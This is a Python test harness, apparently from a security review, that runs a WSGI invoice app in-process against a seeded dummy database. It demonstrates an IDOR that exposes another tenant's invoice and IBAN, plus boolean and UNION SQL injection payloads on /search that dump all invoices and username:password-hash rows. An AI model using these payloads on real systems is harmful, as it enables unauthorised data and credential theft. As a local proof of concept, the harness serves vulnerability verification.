"""Bounded local harness. Drives the WSGI app in-process (no sockets) against a
dummy two-tenant DB to settle two invariants: per-owner access on /invoices/<id>
and parameterization on /search. Target code is on sys.path read-only; this file
lives outside the target copy. Run with: python3 -I probe.py <target_copy_dir>"""
import sys, os, json, importlib

target = sys.argv[1]
sys.path.insert(0, target)

# Seed a dummy DB in the current (scratch) working directory by running seed.py's
# logic against the cwd. seed.py executes at import time and writes ./invoices.db.
importlib.import_module("seed")

import app as appmod       # noqa: E402
import auth as authmod     # noqa: E402


def call(path, qs="", token=None, method="GET", body=""):
    captured = {}

    def start(status, headers):
        captured["status"] = status

    environ = {
        "PATH_INFO": path,
        "QUERY_STRING": qs,
        "REQUEST_METHOD": method,
        "HTTP_AUTHORIZATION": ("Bearer " + token) if token else "",
    }
    if method == "POST":
        import io
        data = body.encode()
        environ["wsgi.input"] = io.BytesIO(data)
        environ["CONTENT_LENGTH"] = str(len(data))
    out = appmod.app(environ, start)
    return captured["status"], json.loads(b"".join(out).decode())


print("== login as bob (id 2) ==")
st, bob = call("/login", method="POST", body="user=bob&password=demo-password")
print(st, bob)
token = bob["token"]

print("\n== bob requests /invoices/1 (owner is alice, id 1) ==")
st, inv = call("/invoices/1", token=token)
print(st, inv)
assert inv.get("owner_id") == 1, "expected alice's invoice owner_id=1"
print("IDOR: bob read alice's invoice incl IBAN:", inv.get("iban"))

print("\n== bob's own /invoices listing (baseline, owner-scoped) ==")
st, mine = call("/invoices", token=token)
print(st, mine)

print("\n== /search with boolean SQLi payload (dump all owners' invoices) ==")
st, rows = call("/search", qs="q=" + __import__("urllib.parse", fromlist=["quote"]).quote("' OR 1=1 -- "), token=token)
print(st, rows)
owners = {r["id"] for r in rows}
print("rows returned:", len(rows), "invoice ids:", sorted(owners))

print("\n== /search with UNION SQLi payload (dump credential store) ==")
payload = "' UNION SELECT id, username || ':' || hex(pw_hash), 0 FROM users -- "
st, rows = call("/search", qs="q=" + __import__("urllib.parse", fromlist=["quote"]).quote(payload), token=token)
print(st, rows)
leaked = [r["customer"] for r in rows if ":" in str(r.get("customer", ""))]
print("leaked credential rows:", leaked)
